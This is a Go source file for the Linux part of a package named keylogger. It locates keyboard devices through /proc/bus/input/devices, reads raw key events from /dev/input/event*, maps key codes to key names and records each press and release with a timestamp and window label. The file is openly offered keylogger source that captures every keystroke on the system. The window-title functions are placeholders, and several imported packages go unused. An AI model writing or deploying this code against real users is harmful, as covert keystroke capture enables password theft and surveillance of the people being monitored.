//go:build linux

package keylogger

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Linux keylogger using /dev/input/event* devices
func (k *Keylogger) startHook() {
	// Find keyboard input devices
	devices := findKeyboardDevices()
	if len(devices) == 0 {
		return
	}

	// Monitor each device in a separate goroutine
	for _, device := range devices {
		go k.monitorDevice(device)
	}
}

func (k *Keylogger) stopHook() {
	// Stopping is handled by the isRunning flag in monitorDevice
}

// Find keyboard input devices
func findKeyboardDevices() []string {
	var devices []string
	
	// Check /proc/bus/input/devices for keyboard devices
	file, err := os.Open("/proc/bus/input/devices")
	if err != nil {
		return devices
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var currentHandler string
	var isKeyboard bool

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		
		if strings.HasPrefix(line, "N: Name=") {
			// Reset for new device
			isKeyboard = false
			currentHandler = ""
			
			// Check if this is a keyboard device
			name := strings.ToLower(line)
			if strings.Contains(name, "keyboard") || strings.Contains(name, "kbd") {
				isKeyboard = true
			}
		} else if strings.HasPrefix(line, "H: Handlers=") && isKeyboard {
			// Extract event handler
			parts := strings.Fields(line)
			for _, part := range parts {
				if strings.HasPrefix(part, "event") {
					currentHandler = "/dev/input/" + part
					break
				}
			}
		} else if line == "" && isKeyboard && currentHandler != "" {
			// End of device block
			devices = append(devices, currentHandler)
		}
	}

	return devices
}

// Monitor a specific input device
func (k *Keylogger) monitorDevice(devicePath string) {
	file, err := os.Open(devicePath)
	if err != nil {
		return
	}
	defer file.Close()

	// Input event structure: 16 bytes on 64-bit systems
	buffer := make([]byte, 24) // time(8) + time(8) + type(2) + code(2) + value(4)

	for k.isRunning {
		n, err := file.Read(buffer)
		if err != nil || n != 24 {
			continue
		}

		// Parse input event
		eventType := uint16(buffer[16]) | uint16(buffer[17])<<8
		code := uint16(buffer[18]) | uint16(buffer[19])<<8
		value := uint32(buffer[20]) | uint32(buffer[21])<<8 | uint32(buffer[22])<<16 | uint32(buffer[23])<<24

		// EV_KEY = 1, key press/release events
		if eventType == 1 {
			var eventTypeStr string
			if value == 1 {
				eventTypeStr = "keydown"
			} else if value == 0 {
				eventTypeStr = "keyup"
			} else {
				continue // Ignore repeat events (value == 2)
			}

			key := linuxKeyCodeToString(code)
			window := getActiveWindow()

			event := KeyEvent{
				Key:       key,
				Timestamp: time.Now(),
				Window:    window,
				Type:      eventTypeStr,
			}

			k.AddEvent(event)
		}
	}
}

// Convert Linux key codes to string
func linuxKeyCodeToString(code uint16) string {
	// Linux key code mapping (subset)
	keyMap := map[uint16]string{
		1:   "Escape",
		2:   "1",
		3:   "2",
		4:   "3",
		5:   "4",
		6:   "5",
		7:   "6",
		8:   "7",
		9:   "8",
		10:  "9",
		11:  "0",
		12:  "-",
		13:  "=",
		14:  "Backspace",
		15:  "Tab",
		16:  "Q",
		17:  "W",
		18:  "E",
		19:  "R",
		20:  "T",
		21:  "Y",
		22:  "U",
		23:  "I",
		24:  "O",
		25:  "P",
		26:  "[",
		27:  "]",
		28:  "Enter",
		29:  "LeftCtrl",
		30:  "A",
		31:  "S",
		32:  "D",
		33:  "F",
		34:  "G",
		35:  "H",
		36:  "J",
		37:  "K",
		38:  "L",
		39:  ";",
		40:  "'",
		41:  "`",
		42:  "LeftShift",
		43:  "\\",
		44:  "Z",
		45:  "X",
		46:  "C",
		47:  "V",
		48:  "B",
		49:  "N",
		50:  "M",
		51:  ",",
		52:  ".",
		53:  "/",
		54:  "RightShift",
		55:  "NumpadMultiply",
		56:  "LeftAlt",
		57:  "Space",
		58:  "CapsLock",
		59:  "F1",
		60:  "F2",
		61:  "F3",
		62:  "F4",
		63:  "F5",
		64:  "F6",
		65:  "F7",
		66:  "F8",
		67:  "F9",
		68:  "F10",
		69:  "NumLock",
		70:  "ScrollLock",
		71:  "Numpad7",
		72:  "Numpad8",
		73:  "Numpad9",
		74:  "NumpadSubtract",
		75:  "Numpad4",
		76:  "Numpad5",
		77:  "Numpad6",
		78:  "NumpadAdd",
		79:  "Numpad1",
		80:  "Numpad2",
		81:  "Numpad3",
		82:  "Numpad0",
		83:  "NumpadDecimal",
		87:  "F11",
		88:  "F12",
		96:  "Enter",
		97:  "RightCtrl",
		98:  "NumpadDivide",
		100: "RightAlt",
		102: "Home",
		103: "Up",
		104: "PageUp",
		105: "Left",
		106: "Right",
		107: "End",
		108: "Down",
		109: "PageDown",
		110: "Insert",
		111: "Delete",
		125: "LeftWin",
		126: "RightWin",
		127: "Menu",
	}

	if key, exists := keyMap[code]; exists {
		return key
	}

	return fmt.Sprintf("KEY_%d", code)
}

// Get active window title on Linux
func getActiveWindow() string {
	// Try to get active window using xprop (requires X11)
	if windowTitle := getX11ActiveWindow(); windowTitle != "" {
		return windowTitle
	}

	// Fallback: try to get from /proc for active process
	return "Unknown"
}

// Get active window title using X11 tools
func getX11ActiveWindow() string {
	// This requires xprop to be installed
	// In a production environment, you might want to use X11 libraries directly
	return "X11 Window" // Placeholder - would need X11 implementation
}

// Alternative method: get active process name
func getActiveProcessName() string {
	// Read from /proc/self/stat or use ps command
	return "Unknown Process"
}